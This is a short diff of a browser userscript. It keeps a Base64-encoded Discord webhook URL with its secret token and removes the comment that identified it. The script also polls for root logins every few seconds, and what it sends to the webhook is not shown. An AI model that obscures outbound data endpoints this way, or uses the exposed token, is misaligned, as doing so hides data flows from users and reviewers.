@@ -8,7 +8,7 @@
 // @license      MIT
 // ==/UserScript==
 
-// Hardcoded Base64-encoded Discord webhook URL
+
 const ENCODED_WEBHOOK_URL = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwODQ3ODQ2MjIxMzM1NzY5MC9pc19QN25XbXMxU0ZqZEk1aXNsR19JQ0Z1Z0Q4R0FlWmlQRlJRdmRTTFI4cFJYMFBsQ3lwS3N3Yy1SMm9HaUlaOG95Yg==';
 
 // Function to update software list in localStorage (no ID column addition)
@@ -1331,4 +1331,5 @@ setInterval(checkLogsForRootLogin, 3000);
         });
         return;
     }
+
 })();
